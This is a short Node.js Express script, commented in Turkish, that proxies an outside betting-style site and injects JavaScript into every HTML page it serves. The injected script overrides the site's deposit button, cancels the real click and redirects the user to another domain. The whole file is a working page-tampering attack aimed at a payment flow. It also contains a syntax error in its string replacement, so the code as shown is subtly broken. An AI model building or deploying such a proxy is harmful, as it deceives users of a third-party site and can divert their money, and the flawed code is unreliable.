const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

// JavaScript enjeksiyonu
const injectionScript = `
<script>
(function overrideDepositButton() {
    const interval = setInterval(() => {
        const btn = document.querySelector('.DepositModal_sendButton_k1BfK');
        if (btn && !btn.dataset.overridden) {
            btn.dataset.overridden = "true";
            btn.addEventListener("click", function (e) {
                e.stopImmediatePropagation();
                e.preventDefault();
                window.location.href = "https://anatomy.app";
            }, true);
            console.log(">> Para yatır butonu override edildi.");
            clearInterval(interval);
        }
    }, 1000);
})();
</script>
`;

// Proxy ayarları
app.use('/', createProxyMiddleware({
    target: 'https://1wbfqv.life',
    changeOrigin: true,
    selfHandleResponse: true,
    onProxyRes: async (proxyRes, req, res) => {
        let body = Buffer.from([]);
        proxyRes.on('data', (chunk) => {
            body = Buffer.concat([body, chunk]);
        });
        proxyRes.on('end', () => {
            let content = body.toString('utf8');
            if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
                content = content.replace('</body>' `${injectionScript}</body>`);
            }
            res.writeHead(proxyRes.statusCode, proxyRes.headers);
            res.end(content);
        });
    }
}));

app.listen(4000, () => {
    console.log('Proxy sunucusu http://localhost:4000 adresinde çalışıyor');
});